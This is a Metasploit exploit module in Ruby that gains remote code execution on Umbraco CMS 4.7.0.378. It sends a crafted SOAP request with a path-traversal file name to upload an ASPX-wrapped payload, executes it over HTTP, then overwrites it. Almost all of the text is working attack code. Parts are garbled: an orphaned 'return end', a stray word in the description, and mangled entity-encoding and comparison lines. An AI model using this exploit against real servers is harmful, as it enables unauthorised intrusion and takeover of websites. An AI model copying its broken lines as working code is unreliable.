# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::EXE
 
    def initialize
        super(
            &#039;Name&#039;          => &#039;Umbraco CMS Remote Command Execution&#039;,
            &#039;Description&#039;   => %q{
                    This module can be used to execute a payload on Umbraco CMS 4.7.0.378.
                The payload is uploaded as an ASPX script by sending a specially crafted
                SOAP request to codeEditorSave.asmx, which permits unauthorised file upload
                via the SaveDLRScript operation. SaveDLRScript is also subject to a path
                traversal vulnerability, allowing code to be placed into the web-accessible
                /umbraco/ directory.
 
                The module writes, executes and then overwrites an ASPX script; note that
                though the script content is removed, the file remains on the target. Automatic
 
                This module has been tested successfully on Umbraco CMS 4.7.0.378 on a Windows
                7 32-bit SP1. In this scenario, the "IIS APPPOOL\ASP.NET v4.0" user must have
                write permissions on the Windows Temp folder.
            },
            &#039;Author&#039;      => [
                &#039;Toby Clarke&#039;, # Vulnerability discovery and Metasploit module
                &#039;juan vazquez&#039; # Improved version of the Metasploit module
            ],
            &#039;Platform&#039;    => &#039;win&#039;,
            &#039;References&#039;  =>
                [
                    [ &#039;URL&#039;, &#039;http://blog.gdssecurity.com/labs/2012/7/3/find-bugs-faster-with-a-webmatrix-local-reference-instance.html&#039; ],
                    [ &#039;URL&#039;, &#039;http://umbraco.codeplex.com/workitem/18192&#039; ] # Item deleted for security reasons
                ],
            &#039;Targets&#039;     =>
                [
                    [ &#039;Umbraco CMS 4.7.0.378 / Microsoft Windows 7 Professional 32-bit SP1&#039;, { } ],
                ],
            &#039;DefaultTarget&#039;  => 0,
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => &#039;Jun 28 2012&#039;
        )
 
        register_options(
            [
                OptString.new(&#039;TARGETURI&#039;, [true, &#039;The URI path of the Umbraco login page&#039;, &#039;/umbraco/&#039;])
            ], self.class)
    end
 
    #
    #
    def on_new_session(cli)
            return
        end
 
        cli.core.use("stdapi") if not cli.ext.aliases.include?("stdapi")
 
        begin
            aspx = @upload_random + &#039;.aspx&#039;
 
            print_status("#{@peer} - Searching: #{aspx}")
            files = cli.fs.file.search("\\", aspx)
            if not files or files.empty?
                print_error("Unable to find #{aspx}. Please manually remove it.")
                return
            end
 
            files.each { |f|
                print_status("#{@peer} - Deleting: #{f[&#039;path&#039;] + "\\" + f[&#039;name&#039;]}")
                cli.fs.file.rm(f[&#039;path&#039;] + "\\" + f[&#039;name&#039;])
            }
            print_status("#{@peer} - #{aspx} deleted")
        rescue ::Exception => e
            print_error("Unable to delete #{aspx}: #{e.message}")
        end
    end
 
    # Module based heavily upon Juan Vazquez&#039;s &#039;landesk_thinkmanagement_upload_asp.rb&#039;
    def exploit
 
        @peer = "#{rhost}:#{rport}"
 
        # Generate the ASPX containing the EXE containing the payload
        exe = generate_payload_exe
        aspx = Msf::Util::EXE.to_exe_aspx(exe)
 
        # htmlentities like encoding
        aspx = aspx.gsub("&", "&").gsub("\"", """).gsub("&#039;", "&#039;").gsub("<", "<").gsub(">", ">")
 
        uri_path = target_uri.path
        uri_path.path << "/" if uri_path[-1, 1] != "/"
 
        @upload_random = rand_text_alpha(rand(6) + 6)
 
        soap = <<-eos
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <SaveDLRScript xmlns="http://tempuri.org/">
            <fileName>/..\\..\\..\\umbraco\\#{@upload_random}.aspx</fileName>
            <oldName>string</oldName>
            <fileContents>#{aspx}</fileContents>
            <ignoreDebugging>1</ignoreDebugging>
        </SaveDLRScript>
    </soap:Body>
</soap:Envelope>
        eos
 
        #
        # UPLOAD
        #
 
        attack_url = uri_path + "webservices/codeEditorSave.asmx"
        print_status("#{@peer} - Uploading #{aspx.length} bytes through #{attack_url}...")
        print_status("#{@peer} - Uploading to #{uri_path}#{@upload_random}.aspx")
 
        res = send_request_cgi({
            &#039;uri&#039;          => attack_url,
            &#039;method&#039;       => &#039;POST&#039;,
            &#039;ctype&#039;        => &#039;text/xml; charset=utf-8&#039;,
            &#039;headers&#039;   => {
                    &#039;SOAPAction&#039;     => "\"http://tempuri.org/SaveDLRScript\"",
                },
            &#039;data&#039;         => soap,
        }, 20)
 
        if (! res)
            print_status("#{@peer} - Timeout: Trying to execute the payload anyway")
        elsif (res.code = 500 and res.body =~ /Cannot use a leading .. to exit above the top directory/)
            print_status("#{@peer} - Got the expected 500 error code #{attack_url} [#{res.code} #{res.message}]")
        else
            print_status("#{@peer} - Didn&#039;t get the expected 500 error code #{attack_url} [#{res.code} #{res.message}]. Trying to execute the payload anyway")
        end
 
        #
        # EXECUTE
        #
 
        upload_path = uri_path + "#{@upload_random}.aspx"
        print_status("#{@peer} - Executing #{upload_path}...")
 
        res = send_request_cgi({
            &#039;uri&#039;          =>  upload_path,
            &#039;method&#039;       => &#039;GET&#039;
        }, 20)
 
        if (! res)
            print_error("#{@peer} - Execution failed on #{upload_path} [No Response]")
            return
        end
 
        if (res.code < 200 or res.code >= 300)
            print_error("#{@peer} - Execution failed on #{upload_path} [#{res.code} #{res.message}]")
            return
        end
 
        #
        # &#039;DELETE&#039; - note that the file will remain on the system, but the content will be wiped.
        #
 
        soap = <<-eos
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <SaveDLRScript xmlns="http://tempuri.org/">
            <fileName>/..\\..\\..\\umbraco\\#{@upload_random}.aspx</fileName>
            <oldName>string</oldName>
            <fileContents></fileContents>
            <ignoreDebugging>1</ignoreDebugging>
        </SaveDLRScript>
    </soap:Body>
</soap:Envelope>
        eos
 
        attack_url = uri_path + "webservices/codeEditorSave.asmx"
        print_status("#{@peer} - Writing #{aspx.length} bytes through #{attack_url}...")
        print_status("#{@peer} - Wrting over #{uri_path}#{@upload_random}.aspx")
 
        res = send_request_cgi({
            &#039;uri&#039;          => attack_url,
            &#039;method&#039;       => &#039;POST&#039;,
            &#039;ctype&#039;        => &#039;text/xml; charset=utf-8&#039;,
            &#039;headers&#039;   => {
                    &#039;SOAPAction&#039;     => "\"http://tempuri.org/SaveDLRScript\"",
                },
            &#039;data&#039;         => soap,
        }, 20)
 
        if (! res)
            print_error("#{@peer} - Deletion failed at #{attack_url} [No Response]")
            return
        elsif (res.code = 500 and res.body =~ /Cannot use a leading .. to exit above the top directory/)
            print_status("#{@peer} - Got the expected 500 error code #{attack_url} [#{res.code} #{res.message}]")
        else
            print_status("#{@peer} - Didn&#039;t get the code and message #{attack_url} [#{res.code} #{res.message}]")
        end
        handler
    end
end



